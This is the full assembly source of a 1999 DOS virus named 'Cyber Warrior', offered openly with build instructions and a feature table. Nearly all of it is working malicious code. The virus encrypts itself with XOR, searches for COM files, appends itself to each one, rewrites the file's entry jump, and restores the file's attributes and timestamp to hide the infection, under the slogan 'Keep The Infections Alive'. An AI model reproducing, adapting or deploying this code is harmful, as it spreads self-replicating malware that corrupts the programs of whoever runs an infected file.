;****************************************************************************
;*                              Virus Information                           *
;*##########################################################################*
;*                                                                          *
;*        Origin: Germany                      Source: The BugHunter        *
;*        Crate Date: 03.07.1999               Version: 1.10                *
;*        Last Modification Date: 06.07.1999                                *
;*                                                                          *
;*              Turbo Assembler Version 4.0    : tasm virus                 *
;*              Turbo Link Version 3.01        : tlink virus                *
;*                                                                          *
;*##########################################################################*
;*                           Modification History                           *
;*==========================================================================*
;*     v1.0    1. Create the Virus Body                                     *
;*             2. Add Payload                                               *
;*             3. Add Encryption for Payload                                *
;* 03/07/1999  4. Add COM-Infection                                         *
;*             5. Add ReSet File Attributes                                 *
;*             6. Add ReSet File Date/Time                                  *
;*             7. Virus Size: 818 Bytes                                     *
;*==========================================================================*
;*     v1.1    1. Now whole Virus is encrypted with filesize in the DTA     *
;* 06/07/1999  2. Virus Size: 895 Bytes                                     *
;****************************************************************************
;
; TSR..................... No
; Encrypted............... Yes
; Appending Virus......... Yes
; Com infector............ Yes
; Exe infector............ No(t yet)
; Ovl infector............ No
; Sys infector............ No
; Pe infector............. No
; Boot infector........... No
; ReSet Attrib............ Yes (Of Course)
; ReSet Time/Date......... Yes (Of Course)
; Avoid Heuristic......... No
; Disable Watchdogs....... No
; Targets Checksums....... No
; Payload................. No
; Message................. Yes
; Error trapping.......... No
; Directory Stealth....... No
; Full Stealth............ No
; Memory Stealth.......... No
; Size Stealth............ No
;
;Bugs:
;-don't know any bugs   ;)
;

display ''
display 'лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
display 'л                          Cyber Warrior Ver 1.10                          л'
display 'л                          (C) 1999 The BugHunter                      :-) л'
display 'лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
display ''
display 'Keep The Infectios Alive!!!!!'
display ''

title  Cyber Warrior
subttl (C) 1999 The BugHunter
subttl Latest revision: 06.07.1999

jumps

.radix 16
code segment
assume cs:code, ds:code, es:code

ID=0cdabh
org 100h

jump_to_virus:
        db      0e9h
        dw      encrypted_area-jump_to_virus-3
        dw      ID                                      ;ID    ;)

virus:
        mov     al, 0abh
        xor     al, 10100101b
        mov     dx, crypt-encrypted_area
        push    dx
        pop     cx
        db      0beh
value   dw      ?
        call    crypt
        jmp     encrypted_area

call_xor_loop:
        call    xor_loop
        ret

encrypted_area:
        call    delta_offset

delta_offset:
        pop     bp
        sub     bp, OFFSET delta_offset

        push    ds
        push    es

restore_com:
        mov     di, 100h
        lea     si, [bp+ orgbytes]
        mov     cx, 05h
        rep     movsb
find_first_com:
        mov     ah, 1ah
        lea     dx, [bp+ dta]
        int     21h

        mov     ah, 4eh
        lea     dx, [bp+ commask]
        mov     cl, 07h

find_file:
        int     21h

        jc      no_files_found

delete_attributes:
        mov     ax, 4301h
        xor     cl, cl
        lea     dx, [bp+ dta+ 1eh]
        int     21h

set_pointer_to_file:
        mov     ax, 3d02h
        lea     dx, [bp+ dta+ 1eh]
        int     21h

        xchg    bx, ax

get_first_five_bytes:
        mov     ah, 3fh
        mov     cx, 05h
        lea     dx, [bp+ orgbytes]
        int     21h

infect_com:
is_it_an_exe_file:
        cmp     2 ptr [bp+ orgbytes], 'MZ'
        je      close_file
        cmp     2 ptr [bp+ orgbytes], 'ZM'
        je      close_file
        cmp     2 ptr [bp+ orgbytes+ 03h], ID
        je      close_file

calculate_jump:
        mov     ax, 2 ptr [bp+ dta+ 1ah]
        sub     ax, 03h
        mov     2 ptr [bp+ virbytes+ 01h],ax

write_new_bytes_to_com:
        mov     ax, 4200h
        xor     cx, cx
        cwd
        int     21h

        mov     ah, 40h
        lea     dx, [bp+ virbytes]
        mov     cx, 05h
        int     21h

        mov     ax, 4202h
        xor     cx, cx
        cwd
        int     21h

        add     ax, encrypted_area- virus+ 100h
        mov     [bp+ value], ax

write_virus_to_eof:

        mov     ax, 4202h
        xor     cx, cx
        cwd
        int     21h

write_virus:

        lea     si, [bp+ virus]
        lea     di, [bp+ the_end]
        mov     cx, the_end- virus
        rep     movsb

        lea     si, [bp+ dta+ 1ah]
        lea     di, [bp+ the_end+ 01h]
        movsb

        lea     si, (encrypted_area-virus)+the_end+bp
        mov     cx, (crypt-encrypted_area)
        mov     al, 1 ptr [bp+ dta+ 1ah]
        xor     al, 10100101b

        call    crypt

        mov     ah, 40h
        mov     cx, temp_data-virus
        lea     dx, [bp+ the_end]
        int     21h

restore_file_date&time:
        mov     ax, 5701h
        mov     cx, 2 ptr [bp+ dta+ 16h]
        mov     dx, 2 ptr [bp+ dta+ 18h]
        int     21h

restore_attributes:
        mov     ax, 4301h
        mov     cl, 1 ptr [bp+ dta+ 15h]
        lea     dx, [bp+ dta+ 1eh]
        int     21h

close_file:
        mov     ah, 3eh
        int     21h

find_next_file:
        mov     ah, 4fh
        jmp     find_file

no_files_found:
pay_load:
        mov     dx, 80h
        mov     ah, 1ah
        int     21h

        mov     ah, 09h
        lea     dx, [bp+ msg]
        int     21h

back_to_com:
        mov     si, 100h
        jmp     si

virusdata:
orgbytes db     0cdh, 020h, 0, 0, 0
virbytes db     0e9h, 000h, 0, 0abh, 0cdh
commask  db     '*.com',0

pay_load_data:
msg     db      0dh, 0ah, '**************************************************************', 0dh, 0ah
        db      '*                       Virus Information                    *', 0dh, 0ah
        db      '*############################################################*', 0dh, 0ah
        db      '* Origin: Germany                      Source: The BugHunter *', 0dh, 0ah
        db      '* Crate Date: 03.07.1999               Version: 1.10         *', 0dh, 0ah
        db      '* Last Modification Date: 06.07.1999   Name: Cyber Warrior   *', 0dh, 0ah
        db      '*                     We are outta here!                     *', 0dh, 0ah
        db      '**************************************************************', 0dh, 0ah, '$'

whoami  db      '{CybErWArriOr}[ThEBuGHuNtEr]'
whatsmygoal db  'Keep the Infections alive!'
crypt:
        call    call_xor_loop
        ret

xor_loop:
        xor     1 ptr cs:[si], al
        inc     si
        loop    xor_loop
        ret

temp_data:
        db      0dh, 0ah, 'Just Temp Data:', 0dh, 0ah
dummy   db      0
dummy2  db      0
dummy3  dw      0
dta     db      42h dup (?)
buffer  db      1ah dup (?)
text    db      0dh, 0ah, 'Just for fun ;)', 0dh, 0ah
        db      'My first virus written without any tutorials and without copy and paste   ;)', 0dh, 0ah
        db      'Keep The Infections Alive!!!!!'
eof     db      '---===EOF===---'

the_end:

code ends
end jump_to_virus
end
